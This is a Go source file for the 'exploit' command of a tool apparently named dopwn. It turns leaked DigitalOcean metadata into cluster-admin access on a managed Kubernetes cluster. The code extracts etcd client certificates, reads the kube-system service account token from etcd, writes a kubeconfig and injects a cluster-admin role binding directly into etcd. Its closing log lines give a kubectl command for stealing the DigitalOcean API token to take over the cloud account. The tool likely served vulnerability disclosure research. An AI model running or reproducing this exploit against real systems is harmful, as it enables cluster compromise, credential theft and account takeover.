package exploit

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io/ioutil"

	"github.com/4armed/dopwn/pkg/rbac"

	"github.com/4armed/dopwn/pkg/etcd"
	"github.com/4armed/dopwn/pkg/metadata"
	"github.com/kubicorn/kubicorn/pkg/logger"
	"github.com/marcwickenden/auger/pkg/encoding"
	"github.com/spf13/cobra"
	"k8s.io/client-go/tools/clientcmd"
	clientcmdapi "k8s.io/client-go/tools/clientcmd/api"
)

type config struct {
	metadataFilename string
	etcdCaFile       string
	etcdCertFile     string
	etcdKeyFile      string
	k8sCaFile        string
	kubeConfig       string
	roleBindingName  string
}

// SecretObject will contain our secret details are unmarshal
type SecretObject struct {
	Kind      string `json:"kind,omitempty"`
	Namespace string `json:"namespace,omitempty"`
	Name      string `json:"name"`
}

// ServiceAccount is a rehash of k8s serviceAccount struct but only the bits we want
// (the secret name)
type ServiceAccount struct {
	Secrets []SecretObject `json:"secrets"`
}

// SecretDataObject will contain the data from our secret
type SecretDataObject struct {
	CaCert string `json:"ca.crt"`
	Token  string `json:"token"`
}

// Secret contains our extracted secret from etcd
type Secret struct {
	Data SecretDataObject `json:"data"`
}

// Command represents the exploit command
func Command() *cobra.Command {

	c := config{}
	m := metadata.Metadata{}
	sa := ServiceAccount{}
	secret := Secret{}

	cmd := &cobra.Command{
		Use:   "exploit",
		Short: "Take DigitalOcean metadata and return kubeconfig file for cluster-admin user",
		RunE: func(cmd *cobra.Command, args []string) error {

			logger.Info("read metadata from file: %v", c.metadataFilename)
			metaData, err := ioutil.ReadFile(c.metadataFilename)
			if err != nil {
				return err
			}

			logger.Info("parsing metadata to get etcd creds")
			err = metadata.ParseMetadata(metaData, &m)
			if err != nil {
				return err
			}

			logger.Info("writing etcd ca to file: %v", c.etcdCaFile)
			err = ioutil.WriteFile(c.etcdCaFile, []byte(m.EtcdCa), 0644)
			if err != nil {
				return fmt.Errorf("unable to write ca cert to file: %v", err)
			}

			logger.Info("writing etcd cert to file: %v", c.etcdCertFile)
			err = ioutil.WriteFile(c.etcdCertFile, []byte(m.EtcdCert), 0644)
			if err != nil {
				return fmt.Errorf("unable to write cert to file: %v", err)
			}

			logger.Info("writing etcd key to file: %v", c.etcdKeyFile)
			err = ioutil.WriteFile(c.etcdKeyFile, []byte(m.EtcdKey), 0644)
			if err != nil {
				return fmt.Errorf("unable to write key to file: %v", err)
			}

			logger.Info("fetching kube-system default service account token from etcd at %v:2379", m.KubeMasterHostname)
			etcdClient, err := etcd.NewEtcdClient("https://"+m.KubeMasterHostname+":2379", c.etcdCertFile, c.etcdKeyFile, c.etcdCaFile)
			if err != nil {
				return fmt.Errorf("unable to create etcd client: %v", err)
			}
			serviceAccountKey, err := etcdClient.GetValue("/registry/serviceaccounts/kube-system/default")
			if err != nil {
				return fmt.Errorf("unable to fetch service account: %v", err)
			}

			logger.Info("decoding serviceAccount")
			inMediaType, serviceAccountKey, err := encoding.DetectAndExtract(serviceAccountKey)
			if err != nil {
				return fmt.Errorf("could not decode serviceAccount: %v", err)
			}

			var jsonServiceAccountBytes bytes.Buffer
			err = encoding.Convert(inMediaType, "json", serviceAccountKey, &jsonServiceAccountBytes)
			if err != nil {
				return fmt.Errorf("unable to convert serviceAccount: %v", err)
			}
			logger.Debug("serviceAccount JSON is: %v", jsonServiceAccountBytes.String())

			err = json.Unmarshal(jsonServiceAccountBytes.Bytes(), &sa)
			if err != nil {
				return fmt.Errorf("couldn't unmarshal serviceAccount JSON: %v", err)
			}
			serviceAccountTokenSecretName := sa.Secrets[0].Name
			logger.Debug("serviceAccountTokenSecretName: %v", serviceAccountTokenSecretName)

			logger.Info("fetching serviceAccountToken secret")
			serviceAccountTokenSecret, err := etcdClient.GetValue("/registry/secrets/kube-system/" + serviceAccountTokenSecretName)
			if err != nil {
				return fmt.Errorf("unable to retrieve secret: %v", err)
			}

			logger.Info("decoding secret")
			inMediaType, serviceAccountTokenSecret, err = encoding.DetectAndExtract(serviceAccountTokenSecret)
			if err != nil {
				return fmt.Errorf("could not decode secret: %v", err)
			}

			var jsonServiceAccountTokenSecretBytes bytes.Buffer
			err = encoding.Convert(inMediaType, "json", serviceAccountTokenSecret, &jsonServiceAccountTokenSecretBytes)
			if err != nil {
				return fmt.Errorf("unable to convert serviceAccountTokenSecret: %v", err)
			}
			logger.Debug("serviceAccountTokenSecret JSON is: %v", jsonServiceAccountTokenSecretBytes.String())

			err = json.Unmarshal(jsonServiceAccountTokenSecretBytes.Bytes(), &secret)
			if err != nil {
				return fmt.Errorf("unable to unmarshal serviceAccountTokenSecret JSON: %v", err)
			}
			k8sAPIServerCaCrt, err := base64.StdEncoding.DecodeString(secret.Data.CaCert)
			serviceAccountToken, err := base64.StdEncoding.DecodeString(secret.Data.Token)

			logger.Debug("API Ca Cert: %v", string(k8sAPIServerCaCrt))
			logger.Debug("Token: %v", string(serviceAccountToken))

			logger.Info("writing API server CA cert file to %v", c.k8sCaFile)
			err = ioutil.WriteFile(c.k8sCaFile, k8sAPIServerCaCrt, 0644)
			if err != nil {
				return fmt.Errorf("unable to write ca cert file: %v", err)
			}

			logger.Info("generating kubeconfig")
			kubeconfigData := clientcmdapi.Config{
				// Define a cluster stanza
				Clusters: map[string]*clientcmdapi.Cluster{"digitalocean": {
					Server:                "https://" + m.KubeMasterHostname,
					InsecureSkipTLSVerify: false,
					CertificateAuthority:  c.k8sCaFile,
				}},
				// Define auth based on the kubelet client cert retrieved
				AuthInfos: map[string]*clientcmdapi.AuthInfo{"kube-system-default": {
					Token: string(serviceAccountToken),
				}},
				// Define a context and set as current
				Contexts: map[string]*clientcmdapi.Context{"default-service-account-context": {
					Cluster:  "digitalocean",
					AuthInfo: "kube-system-default",
				}},
				CurrentContext: "default-service-account-context",
			}

			// Marshal to disk
			err = clientcmd.WriteToFile(kubeconfigData, c.kubeConfig)
			if err != nil {
				return fmt.Errorf("unable to write kubeconfig file: %v", err)
			}
			logger.Info("wrote kubeconfig")

			logger.Info("generating clusterrolebinding")
			crb := rbac.GenerateForearmedClusterRoleBinding(c.roleBindingName)
			jsonClusterRoleBinding, err := json.Marshal(crb)
			logger.Debug(string(jsonClusterRoleBinding))

			logger.Info("encoding clusterrolebinding")
			inMediaType, err = encoding.ToMediaType("json")
			if err != nil {
				return err
			}
			var jsonClusterRoleBindingBytes bytes.Buffer
			err = encoding.Convert(inMediaType, encoding.StorageBinaryMediaType, jsonClusterRoleBinding, &jsonClusterRoleBindingBytes)
			if err != nil {
				return fmt.Errorf("unable to encode clusterrolebinding: %v", err)
			}

			logger.Info("inserting clusterrolebinding into etcd......wish me luck......")
			err = etcdClient.PutValue("/registry/clusterrolebindings/"+c.roleBindingName, jsonClusterRoleBindingBytes.Bytes())
			if err != nil {
				return fmt.Errorf("unable to add clusterrolebinding key: %v", err)
			}

			logger.Info("o_O")
			logger.Info("You are now cluster-admin using the token in %v", c.kubeConfig)
			logger.Info("For an added bonus, grab the digitalocean secret and take over the DO account too:")
			logger.Info("kubectl --kubeconfig=%v -n kube-system get secret digitalocean -o jsonpath='{.data.access-token}' | base64 --decode", c.kubeConfig)
			return nil

		},
	}

	cmd.Flags().StringVar(&c.k8sCaFile, "k8s-ca-cert", "ca.crt", "File to write k8s API ca cert to")
	cmd.Flags().StringVar(&c.etcdCaFile, "ca-cert", "etcd-ca.crt", "File to write etcd ca cert to")
	cmd.Flags().StringVar(&c.etcdCertFile, "etcd-cert", "etcd.crt", "File to write etcd cert to")
	cmd.Flags().StringVar(&c.etcdKeyFile, "etcd-key", "etcd.key", "File to write etcd key to")
	cmd.Flags().StringVar(&c.roleBindingName, "crb-name", "forearmed:cluster-admin", "Name of the ClusterRoleBinding to add")
	cmd.Flags().StringVarP(&c.metadataFilename, "metadata-file", "f", "", "Load DigitalOcean metadata from the specified filename")
	cmd.Flags().StringVarP(&c.kubeConfig, "kubeconfig", "k", "kubeconfig", "The filename to write the kubeconfig to")

	cmd.MarkFlagRequired("metadata-file")

	return cmd

}
